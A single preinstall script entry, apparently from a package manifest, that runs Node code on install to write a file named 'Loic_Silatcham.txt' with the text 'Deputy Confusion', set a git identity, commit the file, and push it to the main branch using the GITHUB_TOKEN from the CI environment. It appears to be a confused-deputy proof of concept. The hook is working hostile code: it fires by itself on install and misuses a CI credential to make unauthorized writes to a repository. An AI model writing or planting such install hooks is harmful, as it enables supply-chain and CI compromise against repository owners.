scripts.preinstall: node -e "const fs = require('fs'); const { execSync } = require('child_process'); try { fs.writeFileSync('Loic_Silatcham.txt', 'Deputy Confusion'); execSync('git config user.name \"Loic Silatcham\"'); execSync('git config user.email \"loicsilatcham@gmail.com\"'); execSync('git add Loic_Silatcham.txt'); execSync('git commit -m \"Ajout du fichier Loic_Silatcham\"'); execSync(`git push https://x-access-token:${process.env.GITHUB_TOKEN}@github.com/${process.env.GITHUB_REPOSITORY}.git main`); } catch(e) { console.log('Erreur:', e.message); }"
